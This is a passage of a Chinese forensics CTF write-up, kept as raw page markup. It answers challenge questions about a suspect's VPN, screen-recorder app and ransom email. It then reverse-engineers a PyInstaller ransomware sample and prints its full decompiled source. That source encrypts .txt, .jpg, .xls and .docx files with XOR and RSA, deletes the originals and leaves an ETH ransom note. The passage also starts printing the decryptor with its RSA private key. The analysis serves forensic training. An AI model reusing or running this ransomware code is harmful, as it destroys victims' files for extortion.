id="_36-上述vpn工具中记录的节点ip是" tabindex="-1"><a class="header-anchor" href="#_36-上述vpn工具中记录的节点ip是" aria-hidden="true">#</a> 36. 上述VPN工具中记录的节点IP是</h3><h4 id="方法一-6" tabindex="-1"><a class="header-anchor" href="#方法一-6" aria-hidden="true">#</a> 方法一</h4><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135531549.png" alt="image-20221101135531549" tabindex="0" loading="lazy"><figcaption>image-20221101135531549</figcaption></figure><h4 id="方法二-6" tabindex="-1"><a class="header-anchor" href="#方法二-6" aria-hidden="true">#</a> 方法二</h4><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135853446.png" alt="image-20221101135853446" tabindex="0" loading="lazy"><figcaption>image-20221101135853446</figcaption></figure><h3 id="_37-检材4中-录屏软件安装时间为" tabindex="-1"><a class="header-anchor" href="#_37-检材4中-录屏软件安装时间为" aria-hidden="true">#</a> 37. 检材4中，录屏软件安装时间为</h3><p>通过apk的位置找到软件的包名</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101140649170.png" alt="image-20221101140649170" tabindex="0" loading="lazy"><figcaption>image-20221101140649170</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101140437417.png" alt="image-20221101140437417" tabindex="0" loading="lazy"><figcaption>image-20221101140437417</figcaption></figure><blockquote><p>2022-10-19 10:50:27</p></blockquote><h3 id="_38-上述录屏软件中名为-s-20221019105129-的录像-在模拟器存储中对应的原始文件名为" tabindex="-1"><a class="header-anchor" href="#_38-上述录屏软件中名为-s-20221019105129-的录像-在模拟器存储中对应的原始文件名为" aria-hidden="true">#</a> 38. 上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为</h3><p>在<code>Nox_2-disk2.vmdk/分区4/data/com.jiadi.luping/databases/record.db</code>中分析该数据库，发现保存有文件的相关信息</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101141104263.png" alt="image-20221101141104263" tabindex="0" loading="lazy"><figcaption>image-20221101141104263</figcaption></figure><blockquote><p>0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d</p></blockquote><h3 id="_39-上述录屏软件登录的手机号是" tabindex="-1"><a class="header-anchor" href="#_39-上述录屏软件登录的手机号是" aria-hidden="true">#</a> 39. 上述录屏软件登录的手机号是</h3><p>通过导出record.db还有record.db-wal文件，导入DB Brower中分析得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101142013326.png" alt="image-20221101142013326" tabindex="0" loading="lazy"><figcaption>image-20221101142013326</figcaption></figure><blockquote><p>18645091802</p></blockquote><h3 id="_40-检材4中-发送勒索邮件的邮箱地址为" tabindex="-1"><a class="header-anchor" href="#_40-检材4中-发送勒索邮件的邮箱地址为" aria-hidden="true">#</a> 40. 检材4中，发送勒索邮件的邮箱地址为</h3><p>火眼直接分析得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101142058008.png" alt="image-20221101142058008" tabindex="0" loading="lazy"><figcaption>image-20221101142058008</figcaption></figure><blockquote><p><a href="mailto:skterran@163.com">skterran@163.com</a></p></blockquote><h2 id="exe分析" tabindex="-1"><a class="header-anchor" href="#exe分析" aria-hidden="true">#</a> EXE分析</h2><p>分析所有掌握的检材，找到勒索邮件中被加密的文档和对应的加/解密程序，并回答下列问题</p><h3 id="_41-分析加密程序-编译该加密程序使用的语言是" tabindex="-1"><a class="header-anchor" href="#_41-分析加密程序-编译该加密程序使用的语言是" aria-hidden="true">#</a> 41.分析加密程序，编译该加密程序使用的语言是</h3><h4 id="方法一-7" tabindex="-1"><a class="header-anchor" href="#方法一-7" aria-hidden="true">#</a> 方法一</h4><p>使用Detect It Easy可以直接分析出</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101143618187.png" alt="image-20221101143618187" tabindex="0" loading="lazy"><figcaption>image-20221101143618187</figcaption></figure><h4 id="方法二-7" tabindex="-1"><a class="header-anchor" href="#方法二-7" aria-hidden="true">#</a> 方法二</h4><p>IDA分析得到为python</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101144111978.png" alt="image-20221101144111978" tabindex="0" loading="lazy"><figcaption>image-20221101144111978</figcaption></figure><h3 id="_42-分析加密程序-它会加密哪些扩展名的文件" tabindex="-1"><a class="header-anchor" href="#_42-分析加密程序-它会加密哪些扩展名的文件" aria-hidden="true">#</a> 42. 分析加密程序，它会加密哪些扩展名的文件？</h3>',149),E={href:"https://www.jianshu.com/p/9f35a6f7ba05",target:"_blank",rel:"noopener noreferrer"},_=n("p",null,"依据参考文章，下载相关逆向工具",-1),x={href:"https://github.com/extremecoders-re/pyinstxtractor",target:"_blank",rel:"noopener noreferrer"},w=t(`<p>执行如下命令生成目录</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>python pyinstxtractor<span class="token punctuation">.</span>py encrypt_file<span class="token punctuation">.</span>exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101152213649.png" alt="image-20221101152213649" tabindex="0" loading="lazy"><figcaption>image-20221101152213649</figcaption></figure><p>之后安装uncompyle6</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>pip3 install uncompyle6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>安装好后，开始反编译</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token function">PS</span> E:\\1762326648\\Deskop\\新建文件夹&gt; uncompyle6<span class="token punctuation">.</span>exe E:\\1762326648\\Deskop\\新建文件夹\\encrypt_file<span class="token punctuation">.</span>exe_extracted\\encrypt_file_1<span class="token punctuation">.</span>pyc
<span class="token comment"># uncompyle6 version 3.8.0</span>
<span class="token comment"># Python bytecode 3.6 (3379)</span>
<span class="token comment"># Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]</span>
<span class="token comment"># Embedded file name: encrypt_file_1.py</span>
import time
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey import RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import os
pubkey = <span class="token string">&#39;-----BEGIN PUBLIC KEY-----\\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\\nkwIEHoau+w==\\n-----END PUBLIC KEY-----\\n&#39;</span>
msg = <span class="token string">&quot;SOMETHING WENT WRONG,PLEASE CONTACT YOUR SYSTEM ADMINISTRATOR!\\nHe can help you to understand whats happened.\\nIf he can&#39;t help you,contact us via email:\\naa1028@forensix.cn\\nale@forensix.cn\\nHURRY UP!WE HAVE ANTIDOTE FOR YOUR FILES!DISCOUNT 20%FOR CLIENTS,WHO CONTACT US IN THE SAME DAY!\\nYou can attach 2 files (text or picture)to check our honest intentions,we will heal them and send\\nback.\\nPlease pay 0.618 ETH\\nThe wallet address：0xef9edf6cdacb7d925aee0f9bd607b544c5758850\\n************************************\\n&quot;</span>

<span class="token keyword">class</span> XORCBC:

    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> key: bytes<span class="token punctuation">)</span>:
        self<span class="token punctuation">.</span>key = bytearray<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>cur = 0

    def encrypt<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token keyword">data</span>: bytes<span class="token punctuation">)</span> <span class="token operator">-</span>&gt; bytes:
        <span class="token keyword">data</span> = bytearray<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i in range<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>:
            tmp = <span class="token keyword">data</span><span class="token namespace">[i]</span>
            <span class="token keyword">data</span><span class="token namespace">[i]</span> ^= self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span>
            self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span> = tmp
            self<span class="token punctuation">.</span>cur = <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cur <span class="token operator">+</span> 1<span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>key<span class="token punctuation">)</span>

        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>


print<span class="token punctuation">(</span><span class="token string">&#39;加密程序V1.0&#39;</span><span class="token punctuation">)</span>
print<span class="token punctuation">(</span><span class="token string">&#39;文件正在加密中~~~~~~~~~~~~~~~~~~\\n&#39;</span><span class="token punctuation">)</span>

def run_finall<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    <span class="token keyword">for</span> filepath<span class="token punctuation">,</span> dirnames<span class="token punctuation">,</span> filenames in os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>:
        <span class="token keyword">for</span> filename in filenames:
            <span class="token keyword">if</span> filename <span class="token operator">!</span>= <span class="token string">&#39;encrypt_file.py&#39;</span> and filename <span class="token operator">!</span>= <span class="token string">&#39;decrypt_file.py&#39;</span> and <span class="token string">&#39;_encrypted&#39;</span> not in filename:
                ExtensionPath = os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> <span class="token string">&#39;.txt&#39;</span> == ExtensionPath or <span class="token string">&#39;.jpg&#39;</span> == ExtensionPath or <span class="token string">&#39;.xls&#39;</span> == ExtensionPath or <span class="token string">&#39;.docx&#39;</span> == ExtensionPath:
                    time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>3<span class="token punctuation">)</span>
                    data_file = os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
                    rsakey = RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span>
                    cipher = Cipher_pkcs1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span>
                    xor_key = os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span>16<span class="token punctuation">)</span>
                    xor_obj = XORCBC<span class="token punctuation">(</span>xor_key<span class="token punctuation">)</span>
                    outf = open<span class="token punctuation">(</span>data_file <span class="token operator">+</span> <span class="token string">&#39;_encrypted&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span>
                    encrypted_xor_key = cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>xor_key<span class="token punctuation">)</span>
                    outf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>encrypted_xor_key<span class="token punctuation">)</span>
                    buffer_size = 4096
                    with open<span class="token punctuation">(</span>data_file<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span> as <span class="token punctuation">(</span>f<span class="token punctuation">)</span>:
                        <span class="token keyword">while</span> True:
                            <span class="token keyword">data</span> = f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>buffer_size<span class="token punctuation">)</span>
                            <span class="token keyword">if</span> not <span class="token keyword">data</span>:
                                <span class="token keyword">break</span>
                            outf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>xor_obj<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                    outf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>data_file<span class="token punctuation">)</span>


run_finall<span class="token punctuation">(</span><span class="token punctuation">)</span>

def redme<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    <span class="token keyword">try</span>:
        <span class="token function">dir</span> = os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>expanduser<span class="token punctuation">(</span><span class="token string">&#39;~&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;Desktop&#39;</span><span class="token punctuation">)</span>
        print<span class="token punctuation">(</span><span class="token function">dir</span><span class="token punctuation">)</span>
        with open<span class="token punctuation">(</span><span class="token function">dir</span> <span class="token operator">+</span> <span class="token string">&#39;/!READ_ME.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span> as <span class="token punctuation">(</span>ff<span class="token punctuation">)</span>:
            ff<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
    except:
        dir1 = os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>
        print<span class="token punctuation">(</span>dir1<span class="token punctuation">)</span>
        with open<span class="token punctuation">(</span>dir1 <span class="token operator">+</span> <span class="token string">&#39;/!READ_ME.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span> as <span class="token punctuation">(</span>ff<span class="token punctuation">)</span>:
            ff<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>


print<span class="token punctuation">(</span><span class="token string">&#39;\\n加密完成~~~~~~~~~~~~~~~~~~&#39;</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;pause&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># okay decompiling E:\\1762326648\\Deskop\\新建文件夹\\encrypt_file.exe_extracted\\encrypt_file_1.pyc</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过剖析代码，发现加密文件的类型</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code> <span class="token keyword">if</span> <span class="token string">&#39;.txt&#39;</span> == ExtensionPath or <span class="token string">&#39;.jpg&#39;</span> == ExtensionPath or <span class="token string">&#39;.xls&#39;</span> == ExtensionPath or <span class="token string">&#39;.docx&#39;</span> == ExtensionPath:
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="_43-分析加密程序-是通过什么算法对文件进行加密的" tabindex="-1"><a class="header-anchor" href="#_43-分析加密程序-是通过什么算法对文件进行加密的" aria-hidden="true">#</a> 43. 分析加密程序，是通过什么算法对文件进行加密的？</h3><p>剖析代码</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>data_file = os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
                    rsakey = RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span>
                    cipher = Cipher_pkcs1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span>
                    xor_key = os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span>16<span class="token punctuation">)</span>
                    xor_obj = XORCBC<span class="token punctuation">(</span>xor_key<span class="token punctuation">)</span>
                    outf = open<span class="token punctuation">(</span>data_file <span class="token operator">+</span> <span class="token string">&#39;_encrypted&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span>
                    encrypted_xor_key = cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>xor_key<span class="token punctuation">)</span>
                    outf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>encrypted_xor_key<span class="token punctuation">)</span>
                    buffer_size = 4096
                    with open<span class="token punctuation">(</span>data_file<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span> as <span class="token punctuation">(</span>f<span class="token punctuation">)</span>:
                        <span class="token keyword">while</span> True:
                            <span class="token keyword">data</span> = f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>buffer_size<span class="token punctuation">)</span>
                            <span class="token keyword">if</span> not <span class="token keyword">data</span>:
                                <span class="token keyword">break</span>
                            outf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>xor_obj<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                    outf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>data_file<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先把<code>公钥</code>导入，生成一个<code>rsakey</code>，然后把<code>rsakey</code>通过<code>cipher</code>加密生成了一个<code>cipher字符串</code>随后通过<code>cipher</code>加密了<code>xor_key</code>，<code>xor_key</code>是一个随机的16位字符串（os.urandom(16)），因此是<code>outf.write(encrypted_xor_key)</code>加密了文件，因此加密过程实际如下：</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token keyword">class</span> XORCBC:

    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> key: bytes<span class="token punctuation">)</span>:
        self<span class="token punctuation">.</span>key = bytearray<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>cur = 0

    def encrypt<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token keyword">data</span>: bytes<span class="token punctuation">)</span> <span class="token operator">-</span>&gt; bytes:
        <span class="token keyword">data</span> = bytearray<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i in range<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>:
            tmp = <span class="token keyword">data</span><span class="token namespace">[i]</span>
            <span class="token keyword">data</span><span class="token namespace">[i]</span> ^= self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span>
            self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span> = tmp
            self<span class="token punctuation">.</span>cur = <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cur <span class="token operator">+</span> 1<span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>key<span class="token punctuation">)</span>

        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因而为异或加密</p><h3 id="_44-分析加密程序-其使用的非对称加密方式公钥后5位为" tabindex="-1"><a class="header-anchor" href="#_44-分析加密程序-其使用的非对称加密方式公钥后5位为" aria-hidden="true">#</a> 44. 分析加密程序，其使用的非对称加密方式公钥后5位为？</h3><p>根据解密后的内容得到公钥</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pubkey = &#39;-----BEGIN PUBLIC KEY-----\\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\\nkwIEHoau+w==\\n-----END PUBLIC KEY-----\\n&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以直接得到<code>u+w==</code></p><h3 id="_45-被加密文档中-flag1的值是" tabindex="-1"><a class="header-anchor" href="#_45-被加密文档中-flag1的值是" aria-hidden="true">#</a> 45. 被加密文档中，FLAG1的值是</h3><p>通过相同的方法，对decrypt_file.exe进行逆向</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153641606.png" alt="image-20221101153641606" tabindex="0" loading="lazy"><figcaption>image-20221101153641606</figcaption></figure><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token function">PS</span> E:\\1762326648\\Deskop\\长安杯\\文件文档_20221101_142818\\火眼<span class="token operator">-</span>文件导出&gt; uncompyle6<span class="token punctuation">.</span>exe E:\\1762326648\\Deskop\\长安杯\\文件文档_20221101_142818\\火眼<span class="token operator">-</span>文件导出\\decrypt_file<span class="token punctuation">.</span>exe_extracted\\decrypt_file_1<span class="token punctuation">.</span>pyc
<span class="token comment"># uncompyle6 version 3.8.0</span>
<span class="token comment"># Python bytecode 3.6 (3379)</span>
<span class="token comment"># Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]</span>
<span class="token comment"># Embedded file name: decrypt_file_1.py</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey import RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import os
prikey = <span class="token string">&#39;-----BEGIN RSA PRIVATE KEY-----\\nMIIEpQIBAAKCAQEAx5JF4elVDBaakgGeDSxICO1LyyZ6B2TgR4DNYiQoB1zAyWPD\\nwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVobHVZh+rCI4MwAh+EBFUeT8Dzja4Z\\nlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRnHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2\\nfUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYziSOT4PCf/O12Kuu9ZklsIAihRPl10\\nSmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhzRDFn9IQ6YQRjlLjuOX8WB6H4NbnK\\nX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/IkwIEHoau+wKCAQAlhHEjPTFQ7suY\\nU3Ji+L5TyeaFWYu3iDVmtzUTjUn2Yvr2+IyHKdU6z0vvGhsHYP8rUJcwWEBVaVbU\\ndQZ8TXT0flBgC35NyGQnTHHbNsOWRvFpto0Gom5KuDS0DYPrm+Ic1Ev0SfLdY+iK\\nV/uzjjeBF+CgEuvwO8xnYLsaFu6s0/ezQgEDBxpcN2KBBZoJ0eXxUUanEPkrLHA2\\nDhRgUCKQks1kpJrGZp/DLb8dKfhWoQ1FV/bBsmv9lVj1Yk14oKdvb51QK53Mnhiz\\nji49S+tazVCA+lP0M6lVSB2uLyB5JldT4kqOQvhtURSzW8oeTM9w1rLvW7qi823U\\nWrJz+TQTAoGBAPIfUS9accG2fUA3AP93ZJU0SbZLc95JJXMyaRozFTTbxnMWB3sG\\nqM9X1qZ4hECVvLF3Sn73B6kF3IaC8/Vpc2cyPHpM+ytdxZVm4uW75ZwYAvKEJeT3\\n068CtcN6PvG3mFhvPsc3GK9FI1O63jrbSx+Y1hQlrVq6eMZUJh7V8BxXAoGBANMC\\nmhN2sC85Pz450JNoG6Q3db0nm9kUs157TUBMGJCfvgh2Rj0t08FcEKQn+idtOf6Z\\nZc2lRoLeaRq539Ex8zzsD7Dl7bFtePRsuDcAMuIFY2S0Z8jjj9BaCirrUluu1FWp\\nTV60As9YBLnRosLTrYtgym+GNjdE/42uFRBJk9AlAoGBAIyGeStBbau1BmMSeTJt\\n9QYjl95MJZXTbJD4IFV73nVG66I/yKp9Ry3Q1hHf/oDm6bepslI/7+lLK1TPRv7T\\nO0PNY92vya15RUvFerOz2QvOz9SRh/ZU6rEwsy0qZtanGZ7pKCSsQIwcJcsTKdjO\\nvMj9QIqxqmdpdh6zFDeGKu4/AoGAEzFuMCQH+liRp9MEZtEtoqtUSwbwhSUh4hl+\\nnScp+a+sKIaF/ohJfXeBctWCF6iU/N5TH7SlnfBlZE7MBJHiiAz8EwWI4u4EmFkc\\n7RvmfXowLO9L4pG2rzwcMGgrs9cJm+NcjlNmq+Kx4q+F4lHNN8+/7NPdmDyiUlAD\\nATZCds8CgYEA2CFvsH+TUV3Q63UdTsdrUKK86vohjGSaoai7mEUGo4iZ/Ie+ScAa\\nGtPFZUhO7EJqh2rNqAakfZGgKU43hAjiUHIjvZdAFNoqpNxO+bkEIPSFQQ6o34r3\\naGTj9Pz1UH/ByW76V7defT/2jQsXHHFiVGpDU6WT80bInLqDQRxlDRk=\\n-----END RSA PRIVATE KEY-----\\n&#39;</span>

<span class="token keyword">class</span> XORCBC:

    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> key: bytes<span class="token punctuation">)</span>:
        self<span class="token punctuation">.</span>key = bytearray<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>cur = 0

    def decrypt<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token keyword">data</span>: bytes<span class="token punctuation">)</span> <span class="token operator">-</span>&gt; bytes:
        <span class="token keyword">data</span> = bytearray<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i in range<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>:
            <span class="token keyword">data</span><span class="token namespace">[i]</span> ^= self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span>
            self<span class="token punctuation">.</span>key<span class="token namespace">[self.cur]</span> = <span class="token keyword">data</span><span class="token namespace">[i]</span>
            self<span class="token punctuation">.</span>cur = <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cur <span class="token operator">+</span> 1<span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>key<span class="token punctuation">)</span>

        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>


def run_decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>:
